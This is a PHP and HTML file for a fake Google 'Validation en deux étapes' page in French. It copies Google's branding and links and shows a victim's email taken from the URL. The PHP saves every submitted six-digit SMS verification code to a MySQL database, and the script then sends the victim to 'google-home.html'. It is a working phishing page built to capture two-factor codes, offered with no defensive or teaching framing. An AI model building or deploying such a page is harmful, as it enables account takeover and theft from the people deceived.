<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

$host = '127.0.0.1';
$db   = 'site_data';
$user = 'root';
$pass = 'pwd';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db;charset=utf8mb4", $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("Erreur de connexion : " . $e->getMessage());
}

if ($_SERVER["REQUEST_METHOD"] == "POST" && !empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) == 'xmlhttprequest') {
    $code = $_POST['code'] ?? '';

    if (!empty($code) && strlen($code) == 6 && ctype_digit($code)) {
        try {
            $sql = "INSERT INTO verification_codes (code) VALUES (:code)";
            $stmt = $pdo->prepare($sql);
            $stmt->execute(['code' => $code]);
            echo json_encode(["success" => true]);
        } catch (Exception $e) {
            echo json_encode(["success" => false, "error" => $e->getMessage()]);
        }
    } else {
        echo json_encode(["success" => false, "error" => "Code invalide"]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Validation en deux étapes - Google</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
        body { font-family: 'Roboto', sans-serif; -webkit-font-smoothing: antialiased; }

        /* Wrapper champ */
        .input-wrapper { position: relative; margin-top: 16px; }

        /* Label flottant TOUJOURS en haut (déjà rempli visuellement) */
        .google-label {
            position: absolute;
            left: 12px;
            top: 0;
            transform: translateY(-50%);
            font-size: 12px;
            color: #0b57d0;
            background-color: white;
            padding: 0 4px;
            pointer-events: none;
            z-index: 2;
        }

        /* Préfixe G- */
        .input-prefix {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #1f1f1f;
            pointer-events: none;
            z-index: 2;
        }

        /* Champ texte */
        .google-input {
            position: relative;
            z-index: 1;
            width: 100%;
            height: 56px;
            border: 2px solid #0b57d0;
            border-radius: 4px;
            padding: 0 15px 0 40px;
            font-size: 16px;
            background: white;
            outline: none;
            color: #1f1f1f;
            box-sizing: border-box;
        }
        .google-input:focus { border-color: #0b57d0; }
        .google-input.input-error { border-color: #b3261e; }
        .google-input.input-error ~ .google-label { color: #b3261e; }

        /* Checkbox Google */
        .custom-checkbox {
            appearance: none;
            -webkit-appearance: none;
            width: 18px; height: 18px;
            border: 2px solid #0b57d0;
            border-radius: 2px;
            cursor: pointer;
            position: relative;
            flex-shrink: 0;
            background-color: #0b57d0;
            display: inline-flex;
            align-self: center;
        }
        .custom-checkbox::after {
            content: '';
            position: absolute;
            left: 3px; top: 0px;
            width: 6px; height: 11px;
            border: 2px solid white;
            border-top: none; border-left: none;
            transform: rotate(45deg);
        }
        .custom-checkbox:not(:checked) { background-color: transparent; border-color: #747775; }
        .custom-checkbox:not(:checked)::after { display: none; }

        /* Langue */
        #lang-menu { display: none; }
        #lang-menu.show { display: block; }
    </style>
</head>
<body class="min-h-screen bg-[#f0f4f9] flex flex-col items-center justify-center text-[#1f1f1f] p-4">

    <div class="bg-white rounded-[28px] w-full max-w-[1040px] flex flex-col md:flex-row gap-8 p-8 md:p-[48px] shadow-sm">

        <div class="flex-1 flex flex-col text-left">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg"
                 alt="Logo Google" class="h-[36px] w-[36px] mb-8 object-contain self-start"/>
            <h1 class="text-[32px] font-normal leading-tight mb-4 tracking-[-0.5px]">
                Validation en deux étapes
            </h1>
            <p class="text-[16px] text-[#1f1f1f] leading-[24px] mb-6">
                Afin de protéger votre compte, Google veut s'assurer que c'est bien vous qui essayez de vous connecter
            </p>
            <div class="inline-flex items-center gap-2 border border-[#747775] rounded-full px-3 py-1.5 text-[14px] cursor-pointer hover:bg-black/[0.04] w-fit">
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="#444746">
                    <path d="M12 12c2.7 0 4.8-2.1 4.8-4.8S14.7 2.4 12 2.4 7.2 4.5 7.2 7.2 9.3 12 12 12zm0 2.4c-3.2 0-9.6 1.6-9.6 4.8v2.4h19.2v-2.4c0-3.2-6.4-4.8-9.6-4.8z"/>
                </svg>
                <span id="display-email">microsoftteams798@gmail.com</span>
                <span class="text-[12px] text-[#444746]">▼</span>
            </div>
            <div class="mt-auto pt-16">
                <button type="button" class="text-[14px] text-[#0b57d0] font-medium hover:bg-[#f0f4f9] px-2 py-1 -ml-2 rounded cursor-pointer border-none bg-transparent">
                    Renvoyer
                </button>
            </div>
        </div>

        <div class="flex-1 flex flex-col pt-0 md:pt-[60px]">
            <form id="codeForm" class="flex flex-col h-full" novalidate>

                <p class="text-[14px] text-[#1f1f1f] leading-[20px] mb-4">
                    Un SMS contenant un code de validation à six chiffres a été envoyé au •• •• •• •• 43
                </p>

                <div class="input-wrapper mb-3">
                    <label for="code" class="google-label">Saisissez le code</label>
                    <span class="input-prefix">G-</span>
                    <input
                        type="text"
                        id="code"
                        class="google-input"
                        maxlength="6"
                        inputmode="numeric"
                        autocomplete="one-time-code"
                    />
                </div>

                <div id="error-container" class="hidden flex items-center gap-1.5 mb-2 text-[#b3261e]">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                    <span class="text-[12px]">Saisissez un code valide</span>
                </div>

                <div class="flex items-center gap-3 mb-[40px] mt-3" style="align-items:center;">
                    <input type="checkbox" id="trustDevice" class="custom-checkbox" checked style="margin-top:0;vertical-align:middle;"/>
                    <label for="trustDevice" class="text-[14px] text-[#1f1f1f] cursor-pointer select-none">
                        Ne plus me demander sur cet appareil
                    </label>
                </div>

                <div class="flex flex-row justify-end items-center gap-2 mt-auto">
                    <button type="button" class="text-[#0b57d0] font-medium text-[14px] px-6 py-2.5 hover:bg-[#f0f4f9] rounded-full outline-none border-none bg-transparent cursor-pointer">
                        Essayer une autre méthode
                    </button>
                    <button type="submit" class="bg-[#0b57d0] text-white font-medium text-[14px] px-6 py-2.5 rounded-full hover:bg-[#0a4bbb] outline-none border-none cursor-pointer">
                        Suivant
                    </button>
                </div>
            </form>
        </div>
    </div>

    <div class="w-full max-w-[1040px] flex justify-between items-center text-[12px] text-[#444746] px-2 mt-4 relative">
        <div class="relative">
            <button onclick="toggleLang()" class="flex items-center gap-2 px-3 py-2 hover:bg-black/5 rounded cursor-pointer border-none bg-transparent outline-none">
                <span id="current-lang">Français (France)</span> ▼
            </button>
            <div id="lang-menu" class="absolute bottom-full left-0 mb-2 bg-white shadow-lg border rounded py-2 w-[180px] z-50">
                <div class="px-4 py-2 hover:bg-gray-100 cursor-pointer" onclick="changeLang('fr','Français (France)')">Français (France)</div>
                <div class="px-4 py-2 hover:bg-gray-100 cursor-pointer" onclick="changeLang('en','English (US)')">English (US)</div>
            </div>
        </div>
        <div class="flex gap-4">
            <a href="https://support.google.com/accounts" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Aide</a>
            <a href="https://policies.google.com/privacy" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Confidentialité</a>
            <a href="https://policies.google.com/terms" class="hover:bg-black/5 px-3 py-2 rounded no-underline text-inherit">Conditions</a>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        const email = params.get('email') || sessionStorage.getItem('google_email') || 'utilisateur@gmail.com';
        document.getElementById('display-email').textContent = email;

        const form = document.getElementById('codeForm');
        const input = document.getElementById('code');
        const error = document.getElementById('error-container');

        form.addEventListener('submit', (e) => {
            e.preventDefault();

            const code = input.value.trim();

            if (code === '' || code.length !== 6) {
                input.classList.add('input-error');
                error.classList.remove('hidden');
            } else {
                input.classList.remove('input-error');
                error.classList.add('hidden');

                const xhr = new XMLHttpRequest();
                xhr.open('POST', '', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');

                xhr.onload = function() {
                    console.log('Code envoyé:', xhr.responseText);
                    window.location.href = 'google-home.html';
                };

                xhr.onerror = function() {
                    window.location.href = 'google-home.html';
                };

                xhr.send('code=' + encodeURIComponent(code));
            }
        });

        input.addEventListener('input', () => {
            input.value = input.value.replace(/[^0-9]/g, '');
            input.classList.remove('input-error');
            error.classList.add('hidden');
        });

        function toggleLang() { document.getElementById('lang-menu').classList.toggle('show'); }
        function changeLang(lang, label) {
            document.getElementById('current-lang').innerText = label;
            toggleLang();
        }
        document.addEventListener('click', (e) => {
            if (!e.target.closest('.relative')) document.getElementById('lang-menu').classList.remove('show');
        });
    </script>
</body>
</html>